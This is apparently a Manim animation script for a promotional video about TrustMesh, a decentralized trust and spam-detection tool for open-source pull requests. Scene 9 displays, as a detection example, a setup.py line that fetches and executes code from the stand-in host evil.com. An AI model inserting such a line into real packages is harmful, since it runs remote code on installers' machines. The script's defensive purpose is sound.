"""
TrustMesh 5-Second Interval Showcase Video Generator (Manim Community Edition).
Renders 12 consecutive 5-second intervals (60 seconds total) with camera cuts,
equations, and direct focus on TrustMesh network tools.
"""

from manim import *

class TrustMeshAnimation(Scene):
    def construct(self):
        self.camera.background_color = "#070b14"

        # [00:00 - 00:05] Scene 1: Topology Boot & Web-of-Trust Peering
        title1 = Text("Scene 1: Web-of-Trust Topology Boot", font_size=28, color="#10b981").to_edge(UP)
        tool1 = Text("Tool: TrustNetwork (src/trustmesh/graph.py:40)", font_size=18, color="#94a3b8").next_to(title1, DOWN)
        node_you = Dot(point=LEFT * 3, radius=0.25, color="#10b981")
        node_b = Dot(point=RIGHT * 0.5 + UP * 1.5, radius=0.22, color="#06b6d4")
        node_c = Dot(point=RIGHT * 0.5 + DOWN * 1.5, radius=0.22, color="#3b82f6")
        edge_yb = Arrow(node_you.get_center(), node_b.get_center(), buff=0.3, color="#10b981")
        edge_yc = Arrow(node_you.get_center(), node_c.get_center(), buff=0.3, color="#06b6d4")
        lbl_yb = Text("W = 0.95", font_size=16, color="#10b981").next_to(edge_yb, UP)
        lbl_yc = Text("W = 0.90", font_size=16, color="#06b6d4").next_to(edge_yc, DOWN)
        
        self.play(Write(title1), FadeIn(tool1), run_time=1.0)
        self.play(FadeIn(node_you), FadeIn(node_b), FadeIn(node_c), run_time=1.5)
        self.play(GrowArrow(edge_yb), GrowArrow(edge_yc), Write(lbl_yb), Write(lbl_yc), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title1, tool1, node_you, node_b, node_c, edge_yb, edge_yc, lbl_yb, lbl_yc)), run_time=0.5)

        # [00:05 - 00:10] Scene 2: Content Addressing & Hash Chains
        title2 = Text("Scene 2: Ed25519 & Monotonic Hash-Chains", font_size=28, color="#38bdf8").to_edge(UP)
        tool2 = Text("Tool: records.py (verify_chain & SHA-256)", font_size=18, color="#94a3b8").next_to(title2, DOWN)
        box1 = Rectangle(height=1.5, width=2.8, color="#38bdf8").shift(LEFT * 3.5)
        box2 = Rectangle(height=1.5, width=2.8, color="#10b981").shift(RIGHT * 0.5)
        t_b1 = Text("Record #101\nSHA-256 Content ID\nEd25519: VALID", font_size=14, color=WHITE).move_to(box1)
        t_b2 = Text("Record #102\nprev=Rec#101\nEd25519: VALID", font_size=14, color=WHITE).move_to(box2)
        chain_arr = Arrow(box1.get_right(), box2.get_left(), buff=0.1, color="#10b981")

        self.play(Write(title2), FadeIn(tool2), run_time=1.0)
        self.play(Create(box1), Write(t_b1), run_time=1.5)
        self.play(GrowArrow(chain_arr), Create(box2), Write(t_b2), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title2, tool2, box1, box2, t_b1, t_b2, chain_arr)), run_time=0.5)

        # [00:10 - 00:15] Scene 3: P2P Set-Difference Gossip
        title3 = Text("Scene 3: P2P Set-Difference Gossip Sync", font_size=28, color="#06b6d4").to_edge(UP)
        tool3 = Text("Tool: node.py (gossip_pull_from)", font_size=18, color="#94a3b8").next_to(title3, DOWN)
        gossip_eq = MathTex(r"\Delta = \mathcal{H}_B \setminus \mathcal{H}_A \quad \implies \text{Ingest missing records in } O(\log N)", font_size=28).shift(UP * 0.5)
        gossip_stat = Text("Transferred: 14 new records | Zero Central Servers", font_size=18, color="#10b981").next_to(gossip_eq, DOWN * 1.5)

        self.play(Write(title3), FadeIn(tool3), run_time=1.0)
        self.play(Write(gossip_eq), run_time=2.0)
        self.play(FadeIn(gossip_stat), run_time=1.5)
        self.wait(0.5)
        self.play(FadeOut(Group(title3, tool3, gossip_eq, gossip_stat)), run_time=0.5)

        # [00:15 - 00:20] Scene 4: Transitive Path Decay
        title4 = Text("Scene 4: Transitive Trust Path & Hop Decay", font_size=28, color="#a855f7").to_edge(UP)
        tool4 = Text("Tool: graph.py (compute_transitive_trust)", font_size=18, color="#94a3b8").next_to(title4, DOWN)
        eq4 = MathTex(r"\text{Trust}(A \to C) = W_{AB} \times W_{BC} \times 0.70^{\text{hops}-1}", font_size=32).shift(UP * 0.5)
        val4 = MathTex(r"= 0.95 \times 0.90 \times 0.70 = \mathbf{0.5985} \ge 0.50", font_size=32, color="#10b981").next_to(eq4, DOWN)
        badge4 = Text("VERDICT: ALLOW_VOUCHED (Fast-Track Merge)", font_size=20, color="#10b981").next_to(val4, DOWN * 1.5)

        self.play(Write(title4), FadeIn(tool4), Write(eq4), run_time=1.5)
        self.play(Write(val4), run_time=1.5)
        self.play(FadeIn(badge4), run_time=1.5)
        self.wait(0.5)
        self.play(FadeOut(Group(title4, tool4, eq4, val4, badge4)), run_time=0.5)

        # [00:20 - 00:25] Scene 5: Fan-Out Dilution Conservation Limiter
        title5 = Text("Scene 5: Fan-Out Dilution Conservation", font_size=28, color="#f59e0b").to_edge(UP)
        tool5 = Text("Tool: node.py:380 (Fan-Out Conservation)", font_size=18, color="#94a3b8").next_to(title5, DOWN)
        eq5 = MathTex(r"W_{\text{eff}}(u \to v) = W(u \to v) \times \min\left(1.0, \frac{8.0}{K_u}\right)", font_size=32).shift(UP * 0.5)
        note5 = Text("Adversary vouched for 32 peers -> Dilution factor = 0.25x", font_size=18, color="#ef4444").next_to(eq5, DOWN)

        self.play(Write(title5), FadeIn(tool5), Write(eq5), run_time=2.0)
        self.play(FadeIn(note5), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title5, tool5, eq5, note5)), run_time=0.5)

        # [00:25 - 00:30] Scene 6: Asymmetric Negative Isolation
        title6 = Text("Scene 6: Asymmetric Negative Isolation", font_size=28, color="#ef4444").to_edge(UP)
        tool6 = Text("Tool: evaluator.py:110 (Negative Isolation)", font_size=18, color="#94a3b8").next_to(title6, DOWN)
        box_shield = Rectangle(height=2.0, width=5.5, color="#10b981").shift(UP * 0.2)
        shield_txt = Text("Hostile Claim from Untrusted Project-X\nIssuer Reputation = 0.00\nQUARANTINED in denouncements_ignored", font_size=16, color=WHITE).move_to(box_shield)

        self.play(Write(title6), FadeIn(tool6), run_time=1.0)
        self.play(Create(box_shield), Write(shield_txt), run_time=3.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title6, tool6, box_shield, shield_txt)), run_time=0.5)

        # [00:30 - 00:35] Scene 7: 64-Permutation MinHash LSH
        title7 = Text("Scene 7: 64-Permutation MinHash LSH", font_size=28, color="#06b6d4").to_edge(UP)
        tool7 = Text("Tool: campaign.py:397 (compute_minhash)", font_size=18, color="#94a3b8").next_to(title7, DOWN)
        eq7 = MathTex(r"\text{sig}[i] = \min_{s \in \text{Shingles}} \left((a_i \cdot h(s) + b_i) \pmod p\right)", font_size=30).shift(UP * 0.5)
        stat7 = Text("Jaccard Match: 0.94 >= 0.65 -> Near-Duplicate PR Collision in O(1)", font_size=18, color="#10b981").next_to(eq7, DOWN)

        self.play(Write(title7), FadeIn(tool7), Write(eq7), run_time=2.0)
        self.play(FadeIn(stat7), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title7, tool7, eq7, stat7)), run_time=0.5)

        # [00:35 - 00:40] Scene 8: Local Sentence-Transformers Embedding
        title8 = Text("Scene 8: Local Open-Weight Vector Embeddings", font_size=28, color="#f43f5e").to_edge(UP)
        tool8 = Text("Tool: sentence-transformers/all-MiniLM-L6-v2 on CPU", font_size=18, color="#94a3b8").next_to(title8, DOWN)
        eq8 = MathTex(r"\text{Embedding} \in \mathbb{R}^{384}, \quad \text{Cosine Sim} \ge 0.85", font_size=32).shift(UP * 0.5)
        stat8 = Text("Cluster Detected: 38 Bot PRs across 38 Repositories -> HOLD", font_size=18, color="#f43f5e").next_to(eq8, DOWN)

        self.play(Write(title8), FadeIn(tool8), Write(eq8), run_time=2.0)
        self.play(FadeIn(stat8), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title8, tool8, eq8, stat8)), run_time=0.5)

        # [00:40 - 00:45] Scene 9: Local Open-Weight AST Code Scanner
        title9 = Text("Scene 9: Local AST & RCE Payload Scanner", font_size=28, color="#e11d48").to_edge(UP)
        tool9 = Text("Tool: Qwen2.5-Coder-1.5B-Instruct (Local CPU)", font_size=18, color="#94a3b8").next_to(title9, DOWN)
        code_box = Rectangle(height=2.0, width=7.0, color="#ef4444").shift(UP * 0.2)
        code_txt = Text("setup.py AST Trigger:\n+ exec(urllib.request.urlopen('evil.com').read())\nVerdict: QUARANTINE_DENOUNCED (Backdoor Proof)", font_size=15, color=WHITE).move_to(code_box)

        self.play(Write(title9), FadeIn(tool9), run_time=1.0)
        self.play(Create(code_box), Write(code_txt), run_time=3.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title9, tool9, code_box, code_txt)), run_time=0.5)

        # [00:45 - 00:50] Scene 10: Bayesian Cold-Start Newcomer Triage
        title10 = Text("Scene 10: Bayesian Newcomer Triage", font_size=28, color="#10b981").to_edge(UP)
        tool10 = Text("Tool: evaluator.py:61 (Beta-Binomial Conjugate)", font_size=18, color="#94a3b8").next_to(title10, DOWN)
        eq10 = MathTex(r"E[T] = \frac{\alpha}{\alpha + \beta} = 0.50, \quad \text{Var}(T) = \frac{1}{12} \approx 0.0833", font_size=30).shift(UP * 0.5)
        badge10 = Text("HONEST_NEWCOMER_TRIAGE: Human Review (Never Block)", font_size=20, color="#f59e0b").next_to(eq10, DOWN * 1.5)

        self.play(Write(title10), FadeIn(tool10), Write(eq10), run_time=2.0)
        self.play(FadeIn(badge10), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title10, tool10, eq10, badge10)), run_time=0.5)

        # [00:50 - 00:55] Scene 11: Bayesian Serial Smearer Penalty & Retraction
        title11 = Text("Scene 11: Smearer Penalty & Retraction", font_size=28, color="#f59e0b").to_edge(UP)
        tool11 = Text("Tool: node.py:459 (Beta(2,1) Updates) & RecordKind.RETRACT", font_size=18, color="#94a3b8").next_to(title11, DOWN)
        eq11 = MathTex(r"R(\text{issuer}) = \min\left(1.0, \frac{\alpha}{\alpha + \beta} \times \frac{3}{2}\right) \implies 0.375", font_size=28).shift(UP * 0.5)
        retract_badge = Text("Signed RecordKind.RETRACT restores reputation instantly", font_size=18, color="#10b981").next_to(eq11, DOWN * 1.5)

        self.play(Write(title11), FadeIn(tool11), Write(eq11), run_time=2.0)
        self.play(FadeIn(retract_badge), run_time=2.0)
        self.wait(0.5)
        self.play(FadeOut(Group(title11, tool11, eq11, retract_badge)), run_time=0.5)

        # [00:55 - 01:00] Scene 12: Decision Matrix & OpenVEX Attestation
        title12 = Text("TrustMesh: Cryptographic Truth for Open Source", font_size=30, color="#10b981").to_edge(UP)
        matrix_table = Table(
            [["@alice_vouched", "ALLOW_VOUCHED", "Fast-Track Merge"],
             ["@dan_denounced", "QUARANTINE_DENOUNCED", "Corroborated Block"],
             ["@sybil_bot_014", "QUARANTINE_CAMPAIGN", "Spam Wave Hold"],
             ["@charlie_newbie", "HONEST_NEWCOMER_TRIAGE", "Human Review Queue"]],
            col_labels=[Text("Contributor", font_size=16), Text("Verdict", font_size=16), Text("Action", font_size=16)],
            include_outer_lines=True
        ).scale(0.55).shift(DOWN * 0.5)

        self.play(Write(title12), Create(matrix_table), run_time=3.0)
        self.wait(2.0)
